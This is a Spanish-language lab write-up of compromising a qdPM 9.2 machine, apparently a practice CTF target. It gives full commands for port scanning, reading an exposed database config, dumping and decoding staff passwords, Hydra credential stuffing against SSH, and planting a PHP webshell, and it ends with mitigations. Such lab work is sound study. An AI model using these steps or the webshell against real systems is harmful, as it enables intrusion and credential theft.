@@ -1,0 +1,219 @@
+================================================================================
+WRITE-UP — qdPM 9.2
+Dificultad: Super Fácil -- El examen será más enrebesado
+Fecha: 16/03/2026
+Autor: D1n0
+================================================================================
+
+ÍNDICE
+------
+1. Reconocimiento
+2. Enumeración
+3. Explotación
+4. Post-Explotación
+5. Flags
+6. Conclusiones
+
+================================================================================
+1. RECONOCIMIENTO
+================================================================================
+
+Primero realicé un descubrimiento de hosts en la red NAT para identificar la IP
+de la máquina objetivo:
+
+    nmap -sn 192.168.X.0/24
+
+IP objetivo identificada: 10.0.2.8
+
+A continuación lancé un scan completo de puertos y servicios:
+
+    nmap -sV -sC -p- --open -T4 -oN Nmap-qdPM.txt 10.0.2.8
+
+Resultados:
+
+    PORT      STATE  SERVICE   VERSION
+    22/tcp    open   ssh       OpenSSH 8.4p1 Debian 5
+    80/tcp    open   http      Apache httpd 2.4.48 (Debian) — qdPM 9.2
+    3306/tcp  open   mysql     MySQL 8.0.26
+    33060/tcp open   mysqlx    MySQL X protocol
+
+Observé que MySQL estaba expuesto directamente al exterior, lo que representa
+un vector crítico. También identifiqué qdPM 9.2 en el puerto 80 y SSH disponible
+para acceso posterior.
+
+================================================================================
+2. ENUMERACIÓN
+================================================================================
+
+--- Enumeración web ---
+
+Usé gobuster para enumerar directorios y ficheros de la aplicación:
+
+    gobuster dir -u http://10.0.2.8 -w /usr/share/wordlists/dirb/common.txt \
+    -x php,txt,yml,conf -t 30
+
+Directorios relevantes que encontré:
+
+    /backups/    (301)
+    /core/       (301)
+    /install/    (301)
+    /uploads/    (301)
+    /robots.txt  (200)
+    /readme.txt  (200)
+
+--- Fichero de configuración expuesto ---
+
+Sabiendo que qdPM 9.2 almacena las credenciales de base de datos en texto claro,
+accedí directamente al fichero de configuración:
+
+    http://10.0.2.8/core/config/databases.yml
+
+Obtuve las siguientes credenciales:
+
+    dsn: 'mysql:dbname=qdpm;host=localhost'
+    username: qdpmadmin
+    password: UcVQCMQk2STVeS6J
+
+--- Enumeración de MySQL ---
+
+Me conecté directamente a MySQL desde Kali. Tuve que desactivar SSL por
+incompatibilidad con el cliente:
+
+    mysql -h 10.0.2.8 -u qdpmadmin -p'UcVQCMQk2STVeS6J' --skip-ssl
+
+Comprobé los permisos del usuario:
+
+    SHOW GRANTS;
+    → GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, FILE, SUPER [...] ON *.*
+
+El usuario tenía el privilegio FILE, lo que permite lectura y escritura de
+ficheros en el sistema. Sin embargo, comprobé que secure_file_priv apuntaba a
+/var/lib/mysql-files/, lo que impedía escribir directamente en el webroot.
+
+    SELECT @@global.secure_file_priv;
+    → /var/lib/mysql-files/
+
+Enumeré las bases de datos disponibles:
+
+    SHOW DATABASES;
+    → information_schema, mysql, performance_schema, qdpm, staff, sys
+
+Dentro de qdpm encontré la tabla configuration con el email y hash del admin:
+
+    SELECT * FROM configuration;
+    → app_administrator_email:    admin@localhost.com
+    → app_administrator_password: $P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0
+
+En la base de datos staff encontré las tablas user y login con información
+de los empleados del sistema:
+
+    SELECT * FROM user;
+    +----+--------+---------------------------+
+    | id | name   | role                      |
+    +----+--------+---------------------------+
+    |  1 | Smith  | Cyber Security Specialist |
+    |  2 | Lucas  | Computer Engineer         |
+    |  3 | Travis | Intelligence Specialist   |
+    |  4 | Dexter | Cyber Security Analyst    |
+    |  5 | Meyer  | Genetic Engineer          |
+    +----+--------+---------------------------+
+
+    SELECT * FROM login;
+    +---------+--------------------------+
+    | user_id | password                 |
+    +---------+--------------------------+
+    |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
+    |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
+    |       1 | WDdNUWtQM1cyOWZld0hkQw== |
+    |       3 | REpjZVZ5OThXMjhZN3dMZw== |
+    |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+    +---------+--------------------------+
+
+Identifiqué que las passwords estaban codificadas en Base64, no cifradas.
+Las decodifiqué fácilmente:
+
+    echo "c3VSSkFkR3dMcDhkeTNyRg==" | base64 -d  →  suRJAdGwLp8dy3rF  (Lucas)
+    echo "N1p3VjRxdGc0MmNtVVhHWA==" | base64 -d  →  7ZwV4qtg42cmUXGX  (Dexter)
+    echo "WDdNUWtQM1cyOWZld0hkQw==" | base64 -d  →  X7MQkP3W29fewHdC  (Smith)
+    echo "REpjZVZ5OThXMjhZN3dMZw==" | base64 -d  →  DJceVy98W28Y7wLg  (Travis)
+    echo "Y3FObkJXQ0J5UzJEdUpTeQ==" | base64 -d  →  cqNnBWCByS2DuJSy  (Meyer)
+
+================================================================================
+3. EXPLOTACIÓN
+================================================================================
+
+--- Ataque de fuerza bruta SSH con Hydra ---
+
+Con los usuarios y passwords recopilados realicé un ataque de credential stuffing
+contra el servicio SSH usando Hydra:
+
+    hydra -L usuarios.txt -P passwords.txt ssh://10.0.2.8
+
+Encontré dos pares de credenciales válidos:
+
+    [22][ssh] login: travis   password: DJceVy98W28Y7wLg
+    [22][ssh] login: dexter   password: 7ZwV4qtg42cmUXGX
+
+--- Acceso SSH ---
+
+Me conecté a la máquina como travis:
+
+    ssh travis@10.0.2.8
+
+================================================================================
+4. POST-EXPLOTACIÓN
+================================================================================
+
+Una vez dentro enumeré el sistema:
+
+    whoami && id
+    → uid=1002(travis) gid=1002(travis) groups=1002(travis),33(www-data)
+
+    sudo -l
+    → Sorry, user travis may not run sudo on debian.
+
+No tenía privilegios sudo, pero observé que travis pertenecía al grupo www-data,
+lo que me daba acceso de escritura al webroot de Apache. Aproveché esto para
+subir una webshell:
+
+    echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
+
+Y la ejecuté desde el navegador:
+
+    http://10.0.2.8/shell.php?cmd=whoami
+
+================================================================================
+5. FLAGS
+================================================================================
+
+user.txt
+
+================================================================================
+6. CONCLUSIONES
+================================================================================
+
+Vulnerabilidades que exploté:
+
+1. Fichero de configuración expuesto (databases.yml)
+   → Obtuve credenciales de base de datos en texto claro accediendo a una ruta
+     conocida de qdPM accesible públicamente.
+
+2. MySQL expuesto al exterior sin restricción de red
+   → Me conecté directamente a la base de datos desde mi máquina atacante.
+
+3. Passwords almacenadas en Base64 en la BD
+   → Base64 es codificación, no cifrado. Las revertí de forma trivial.
+
+4. Reutilización de credenciales
+   → Las passwords extraídas de la BD funcionaron para autenticarme por SSH.
+
+5. Usuario con membresía en grupo www-data
+   → Pude escribir una webshell en el webroot y ejecutar comandos en el sistema.
+
+Mitigaciones recomendadas:
+- No exponer MySQL al exterior (firewall, bind en localhost)
+- Cifrar correctamente las credenciales almacenadas en BD (bcrypt, argon2)
+- No almacenar credenciales de BD en ficheros accesibles vía web
+- Aplicar principio de mínimo privilegio en usuarios del sistema
+
+================================================================================
